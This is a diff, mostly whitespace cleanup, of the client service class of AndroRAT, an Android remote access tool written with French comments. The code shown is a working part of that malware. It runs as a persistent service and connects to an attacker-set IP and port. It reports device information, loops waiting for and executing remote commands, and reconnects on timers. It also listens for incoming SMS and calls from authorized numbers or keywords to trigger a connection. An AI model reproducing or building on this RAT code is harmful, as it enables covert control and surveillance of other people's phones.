@@ -35,9 +35,9 @@ public class Client extends ClientListener implements Controler {
 
 	int nbAttempts = 10; //sera décrementé a 5 pour 5 minute 3 pour  10 minute ..
 	int elapsedTime = 1; // 1 minute
-	
+
 	boolean stop = false; //Pour que les threads puissent s'arreter en cas de déconnexion
-	
+
 	boolean isRunning = false; //Le service tourne
 	boolean isListening = false; //Le service est connecté au serveur
 	//final boolean waitTrigger = false; //On attend un évenement pour essayer de se connecter.
@@ -45,25 +45,25 @@ public class Client extends ClientListener implements Controler {
 	ProcessCommand procCmd ;
 	byte[] cmd ;
 	CommandPacket packet ;
-	
+
 	private Handler handler = new Handler() {
-		
+
 		public void handleMessage(Message msg) {
 			Bundle b = msg.getData();
 			processCommand(b);
 		}
 	};
-	
-	
-	
+
+
+
 	public void onCreate() {
 		Log.i(TAG, "In onCreate");
 		infos = new SystemInfo(this);
 		procCmd = new ProcessCommand(this);
-		
+
 		loadPreferences();
 	}
-	
+
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		//toast = Toast.makeText(this	,"Prepare to laod", Toast.LENGTH_LONG);
 		//loadPreferences("preferences");
@@ -73,20 +73,20 @@ public class Client extends ClientListener implements Controler {
 			return START_STICKY;
 		String who = intent.getAction();
 		Log.i(TAG, "onStartCommand by: "+ who); //On affiche qui a déclenché l'event
-		
+
 		if (intent.hasExtra("IP"))
 			this.ip = intent.getExtras().getString("IP");
 		if (intent.hasExtra("PORT"))
-			this.port = intent.getExtras().getInt("PORT");		
-		
+			this.port = intent.getExtras().getInt("PORT");
+
 		if(!isRunning) {// C'est la première fois qu'on le lance
-			
+
 		  	//--- On ne passera qu'une fois ici ---
 		    IntentFilter filterc = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"); //Va monitorer la connexion
 		    registerReceiver(ConnectivityCheckReceiver, filterc);
 			isRunning = true;
 			conn = new Connection(ip,port,this);//On se connecte et on lance les threads
-			
+
 			if(waitTrigger) { //On attends un evenement pour se connecter au serveur
 			  	//On ne fait rien
 				registerSMSAndCall();
@@ -98,7 +98,7 @@ public class Client extends ClientListener implements Controler {
 					readthread = new Thread(new Runnable() { public void run() { waitInstruction(); } });
 					readthread.start(); //On commence vraiment a écouter
 					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0, infos.getBasicInfos());
-					handleData(0,pack.build());					
+					handleData(0,pack.build());
 					//gps = new GPSListener(this, LocationManager.NETWORK_PROVIDER,(short)4); //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 					isListening = true;
 					if(waitTrigger) {
@@ -112,12 +112,12 @@ public class Client extends ClientListener implements Controler {
 						resetConnectionAttempts();
 						reconnectionAttempts();
 					}
-					else { //On attend l'update du ConnectivityListener pour se débloquer 
+					else { //On attend l'update du ConnectivityListener pour se débloquer
 						Log.w(TAG,"Not Connected wait a Network update");
 					}
 				}
 			}
-		}	
+		}
 		else { //Le service a déjà été lancé
 			if(isListening) {
 				Log.w(TAG,"Called uselessly by: "+ who + " (already listening)");
@@ -143,12 +143,12 @@ public class Client extends ClientListener implements Controler {
 				}
 			}
 		}
-		 
+
 		return START_STICKY;
 	}
-	
-	
-	
+
+
+
 	public void waitInstruction() { //Le thread sera bloqué dedans
 		try {
 			for(;;) {
@@ -157,7 +157,7 @@ public class Client extends ClientListener implements Controler {
 				conn.getInstruction() ;
 			}
 		}
-		catch(Exception e) { 
+		catch(Exception e) {
 			isListening = false;
 			resetConnectionAttempts();
 			reconnectionAttempts();
@@ -166,7 +166,7 @@ public class Client extends ClientListener implements Controler {
 			}
 		}
 	}
-	
+
 	public void processCommand(Bundle b)
     {
 		try{
@@ -176,8 +176,8 @@ public class Client extends ClientListener implements Controler {
 			sendError("Error on Client:"+e.getMessage());
 		}
     }
-	
-	public void reconnectionAttempts() 
+
+	public void reconnectionAttempts()
 	{
 		/*
 		 * 10 fois toute les minutes
@@ -187,7 +187,7 @@ public class Client extends ClientListener implements Controler {
 		 */
 		if(!isConnected)
 			return;
-		
+
 		if(nbAttempts == 0) {
 			switch(elapsedTime) {
 			case 1:
@@ -206,20 +206,20 @@ public class Client extends ClientListener implements Controler {
 		//---- Piece of Code ----
 		Calendar cal = Calendar.getInstance();
 		cal.add(Calendar.MINUTE, elapsedTime);
-		 
+
 		Intent intent = new Intent(this, AlarmListener.class);
-		 
+
 		intent.putExtra("alarm_message", "Wake up Dude !");
-		
+
 		PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
 		// Get the AlarmManager service
 		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);
-		
+
 		//-----------------------
 		nbAttempts --;
 	}
-	
+
 	public void loadPreferences() {
 		PreferencePacket p = procCmd.loadPreferences();
 		waitTrigger = p.isWaitTrigger();
@@ -229,24 +229,24 @@ public class Client extends ClientListener implements Controler {
 		authorizedNumbersSMS = p.getPhoneNumberSMS();
 		authorizedNumbersKeywords = p.getKeywordSMS();
 	}
-	
+
 	public void sendInformation(String infos) { //Methode que le Client doit implémenter pour envoyer des informations
 		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 0, infos).build());
 	}
-	
+
 	public void sendError(String error) { //Methode que le Client doit implémenter pour envoyer des informations
 		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 1, error).build());
 	}
-	
+
 	public void handleData(int channel, byte[] data) {
 		conn.sendData(channel, data);
 	}
 
-	
+
 	public void onDestroy() {
 		//savePreferences("myPref");
 		//savePreferences("preferences");
-		
+
 		Log.i(TAG, "in onDestroy");
 		unregisterReceiver(ConnectivityCheckReceiver);
 		conn.stop();
@@ -254,12 +254,12 @@ public class Client extends ClientListener implements Controler {
 		stopSelf();
 		super.onDestroy();
 	}
-	
+
 	public void resetConnectionAttempts() {
 		nbAttempts = 10;
 		elapsedTime = 1;
 	}
-	
+
 	public void registerSMSAndCall() {
         IntentFilter filter = new IntentFilter();
         filter.addAction("android.provider.Telephony.SMS_RECEIVED"); //On enregistre un broadcast receiver sur la reception de SMS
@@ -269,13 +269,13 @@ public class Client extends ClientListener implements Controler {
         registerReceiver(Callreceiver, filter2);
 	}
 
-	public void Storage(TransportPacket p, String i) 
+	public void Storage(TransportPacket p, String i)
 	{
 		try
 		{
 			packet = new CommandPacket(); //!!!!!!!!!!!! Sinon on peut surement en valeur les arguments des command précédantes !
 			packet.parse(p.getData());
-			
+
 			Message mess = new Message();
 			Bundle b = new Bundle();
 			b.putShort("command", packet.getCommand());
@@ -287,6 +287,6 @@ public class Client extends ClientListener implements Controler {
 		catch(Exception e)
 		{
 			System.out.println("Androrat.Client.storage : pas une commande");
-		}		
+		}
 	}
 }
